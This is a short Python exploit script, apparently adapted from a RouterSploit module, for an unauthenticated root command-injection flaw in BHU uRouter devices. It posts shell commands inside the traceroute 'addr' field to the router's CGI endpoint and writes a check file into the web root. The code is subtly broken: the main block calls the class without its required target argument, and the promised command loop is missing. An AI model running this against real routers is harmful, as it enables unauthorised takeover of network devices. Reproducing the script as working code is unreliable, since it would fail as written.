target = ""
# rsf exploit module
# description: Module exploits BHU uRouter unauthenticated remote code execution vulnerability, which 
# allows executing commands on the router with root privileges.

import re
from requests import post, get  # Standard Python libraries

class Exploit:
    __info__ = {
        "name": "BHU uRouter RCE",
        "description": "Module exploits BHU uRouter unauthenticated remote code execution vulnerability, which "
                       "allows executing commands on the router with root privileges.",
        "authors": (
            "Tao 'depierre' Sauvage",
        ),
        "references": (
            "http://www.ioactive.com/pdfs/BHU-WiFi_uRouter-Security_Advisory_Final081716.pdf",
        ),
        "devices": (
            "BHU uRouter",
        ),
    }

    def __init__(self, target, port=80):
        self.target = target
        self.port = port

    def run(self):
        if self.check():
            print("Target is vulnerable")
            print("Blind command injection - response is not available")
            print("Possible extraction point:")
            print(f"\t- Inject 'CMD > /usr/share/www/routersploit.check'")
            print(f"\t- The result of CMD will be available at {self.target}:{self.port}/routersploit.check")
            print("Invoking command loop (type 'exit' or 'quit' to exit the loop)...")
        else:
            print("Target is not vulnerable")

    def execute(self, cmd):
        headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}
        data = f'<cmd><ITEM cmd="traceroute" addr="$({cmd})" /></cmd>'
        post(f"http://{self.target}:{self.port}/cgi-bin/cgiSrv.cgi", headers=headers, data=data)
        return ''  # Blind RCE so no response available

    def check(self):
        headers = {'Content-Type': 'text/xml', 'X-Requested-With': 'XMLHttpRequest'}
        data = '<cmd><ITEM cmd="traceroute" addr="$({})" /></cmd>'
        # Blind unauth RCE so we first create a file in the www-root directory
        cmd_echo = data.format(u'echo "$USER" > /usr/share/www/routersploit.check')
        response = post(f"http://{self.target}:{self.port}/cgi-bin/cgiSrv.cgi", headers=headers, data=cmd_echo)
        if not response or u'status="doing"' not in response.text:
            return False
        # Second we check that the file was successfully created
        response = get(f"http://{self.target}:{self.port}/routersploit.check")
        if response.status_code != 200 or u'root' not in response.text:
            return False
        # Third we clean up the temp file
        cmd_rm = data.format("rm -f /usr/share/www/routersploit.check")
        post(f"http://{self.target}:{self.port}/cgi-bin/cgiSrv.cgi", headers=headers, data=cmd_rm)
        return True




import sys

if __name__ == "__main__":
    print("Run script:", __file__)
    if len(sys.argv) < 2:
        print(f"Usage: python3 {sys.argv[0]} <target_ip>")
        sys.exit(1)

    target_ip = sys.argv[1]
    exploit = Exploit()
    exploit.target = target_ip
    exploit.run()
